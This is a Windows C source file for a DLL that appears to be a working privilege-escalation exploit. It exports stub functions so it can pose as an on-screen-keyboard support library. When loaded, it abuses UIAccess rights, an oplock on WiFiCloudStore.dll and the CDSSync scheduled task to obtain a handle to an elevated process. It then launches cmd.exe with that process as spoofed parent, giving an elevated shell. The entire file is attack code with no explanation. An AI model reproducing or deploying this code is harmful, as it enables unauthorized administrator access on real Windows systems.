#include <Windows.h>

#include "OpLock.h"

#define PAYLOAD_CMD L"cmd.exe"

__declspec(dllexport) void InitializeOSKSupport()
{
}

__declspec(dllexport) void UninitializeOSKSupport()
{
}

static BOOL CreateProcessWithParentW(WCHAR* cmdline, HANDLE parent, DWORD dwFlags, WORD wShow, PROCESS_INFORMATION* pi)
{
	SIZE_T ptsize = 0;
	STARTUPINFOEXW si = { 0 };
	LPPROC_THREAD_ATTRIBUTE_LIST ptal = NULL;
	BOOL ret = FALSE;

	if (!pi)
	{
		return FALSE;
	}
	InitializeProcThreadAttributeList(NULL, 1, 0, &ptsize);
	ptal = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, ptsize);
	if (!ptal)
	{
		return FALSE;
	}
	memset(&si, 0, sizeof(si));
	si.StartupInfo.cb = sizeof(si);
	si.StartupInfo.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
	si.StartupInfo.wShowWindow = wShow;
	if (!InitializeProcThreadAttributeList(ptal, 1, 0, &ptsize))
	{
		HeapFree(GetProcessHeap(), 0, ptal);
		return FALSE;
	}
	if (!UpdateProcThreadAttribute(ptal, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent, sizeof(HANDLE), NULL, NULL))
	{
		DeleteProcThreadAttributeList(ptal);
		HeapFree(GetProcessHeap(), 0, ptal);
		return FALSE;
	}
	si.lpAttributeList = ptal;
	ret = CreateProcessW(NULL, cmdline, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | dwFlags, NULL, NULL, (STARTUPINFOW*)&si, pi);
	DeleteProcThreadAttributeList(ptal);
	HeapFree(GetProcessHeap(), 0, ptal);
	return ret;
}

typedef HANDLE (WINAPI* __GetProcessHandleFromHwnd)(HWND hwnd);

static HANDLE CallGetProcessHandleFromHwnd(HWND hwnd)
{
	HANDLE process = NULL;
	HMODULE oleacc = NULL;
	__GetProcessHandleFromHwnd _GetProcessHandleFromHwnd = NULL;

	oleacc = LoadLibraryW(L"oleacc.dll");
	if (oleacc)
	{
		_GetProcessHandleFromHwnd = (__GetProcessHandleFromHwnd)GetProcAddress(oleacc, "GetProcessHandleFromHwnd");
		if (_GetProcessHandleFromHwnd)
		{
			process = _GetProcessHandleFromHwnd(hwnd);
		}
		FreeLibrary(oleacc);
	}
	return process;
}

static HANDLE GetHwndFullProcessHandle(HWND hwnd)
{
	HANDLE process = NULL;
	HANDLE dup = NULL;

	process = CallGetProcessHandleFromHwnd(hwnd);
	if (!process)
	{
		return NULL;
	}
	if (!DuplicateHandle(process, (HANDLE)-1, (HANDLE)-1, &dup, 0, FALSE, DUPLICATE_SAME_ACCESS))
	{
		CloseHandle(process);
		return NULL;
	}
	CloseHandle(process);
	return dup;
}

static BOOL EnumElevatedWindows(HWND hwnd, LPARAM lparam)
{
	DWORD pid = 0;
	HANDLE process = NULL;
	HANDLE token = NULL;
	DWORD elevtype = 0;
	DWORD retlen = 0;

	if (!lparam)
	{
		return FALSE;
	}
	GetWindowThreadProcessId(hwnd, &pid);
	if (!pid)
	{
		return TRUE;
	}
	process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (!process)
	{
		return TRUE;
	}
	if (!OpenProcessToken(process, MAXIMUM_ALLOWED, &token))
	{
		CloseHandle(process);
		return TRUE;
	}
	CloseHandle(process);
	retlen = 0;
	if (!GetTokenInformation(token, TokenElevationType, &elevtype, sizeof(elevtype), &retlen))
	{
		CloseHandle(token);
		return TRUE;
	}
	CloseHandle(token);
	if (elevtype == TokenElevationTypeFull)
	{
		*(HWND*)lparam = hwnd;
		return FALSE;
	}
	return TRUE;
}

static HWND FindFirstElevatedWindow()
{
	HWND hwnd = NULL;
	EnumWindows((WNDENUMPROC)EnumElevatedWindows, (LPARAM)&hwnd);
	return hwnd;
}

static BOOL CheckUIAccessPermissions()
{
	HANDLE token = NULL;
	BYTE tmlbuf[sizeof(TOKEN_MANDATORY_LABEL) + sizeof(SID)];
	TOKEN_MANDATORY_LABEL* tml = (TOKEN_MANDATORY_LABEL*)&tmlbuf[0];
	DWORD uiaccess = 0;
	DWORD* integrity = NULL;
	DWORD retlen = 0;

	if (!OpenProcessToken((HANDLE)-1, MAXIMUM_ALLOWED, &token))
	{
		return FALSE;
	}
	retlen = sizeof(uiaccess);
	if (!GetTokenInformation(token, TokenUIAccess, &uiaccess, sizeof(uiaccess), &retlen))
	{
		CloseHandle(token);
		return FALSE;
	}
	if (!uiaccess)
	{
		CloseHandle(token);
		return FALSE;
	}
	retlen = sizeof(tmlbuf);
	if (!GetTokenInformation(token, TokenIntegrityLevel, tml, retlen, &retlen))
	{
		CloseHandle(token);
		return FALSE;
	}
	integrity = GetSidSubAuthority(tml->Label.Sid, 0);
	if (*integrity < 0x3000)
	{
		CloseHandle(token);
		return FALSE;
	}
	CloseHandle(token);
	return TRUE;
}

static BOOL StartBackupLockedElevatedProcess(POPLOCK_FILE_CONTEXT ofc)
{
	WCHAR task_cmdline[200] = { 0 };
	WCHAR oplock_path[100] = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	DWORD exitcode = 1;

	if (!ofc)
	{
		return FALSE;
	}
	if (ofc->len < sizeof(OPLOCK_FILE_CONTEXT))
	{
		return FALSE;
	}
	if (!GetSystemDirectoryW(oplock_path, 80))
	{
		return FALSE;
	}
	lstrcpyW(task_cmdline, oplock_path);
	lstrcatW(oplock_path, L"\\WiFiCloudStore.dll");
	lstrcatW(task_cmdline, L"\\schtasks.exe /RUN /TN \"\\Microsoft\\Windows\\WlanSvc\\CDSSync\" /I");
	if (!OpLockFile(oplock_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, TRUE, ofc))
	{
		return FALSE;
	}
	memset(&pi, 0, sizeof(pi));
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	if (!CreateProcessW(NULL, task_cmdline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		ReleaseOpLock(ofc);
		return FALSE;
	}
	CloseHandle(pi.hThread);
	WaitForSingleObject(pi.hProcess, 3000);
	if (!GetExitCodeProcess(pi.hProcess, &exitcode))
	{
		CloseHandle(pi.hProcess);
		ReleaseOpLock(ofc);
		return FALSE;
	}
	CloseHandle(pi.hProcess);
	if (exitcode)
	{
		ReleaseOpLock(ofc);
		return FALSE;
	}
	return TRUE;
}

static BOOL StopBackupLockedElevatedProcess(POPLOCK_FILE_CONTEXT ofc)
{
	return ReleaseOpLock(ofc);
}

static BOOL StartElevatedCmd()
{
	HWND hwnd = NULL;
	HANDLE process = NULL;
	PROCESS_INFORMATION pi = { 0 };
	OPLOCK_FILE_CONTEXT ofc = { 0 };
	WCHAR cmdline[] = PAYLOAD_CMD;
	BOOL ret = FALSE;
	int i = 0;

	if (CheckUIAccessPermissions())
	{
		memset(&ofc, 0, sizeof(ofc));
		ofc.len = sizeof(ofc);
		ofc.file = INVALID_HANDLE_VALUE;
		hwnd = FindFirstElevatedWindow();
		if (!hwnd)
		{
			if (StartBackupLockedElevatedProcess(&ofc))
			{
				for (i = 0; i < 5000; i += 500)
				{
					Sleep(500);
					hwnd = FindFirstElevatedWindow();
				}
			}
		}
		if (hwnd)
		{
			memset(&pi, 0, sizeof(pi));
			process = GetHwndFullProcessHandle(hwnd);
			if (process)
			{
				ret = CreateProcessWithParentW(cmdline, process, CREATE_NEW_CONSOLE, SW_SHOW, &pi);
				if (ret)
				{
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
				}
				CloseHandle(process);
			}
		}
		if (ofc.file != INVALID_HANDLE_VALUE)
		{
			StopBackupLockedElevatedProcess(&ofc);
		}
	}
	return ret;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		StartElevatedCmd();
		ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

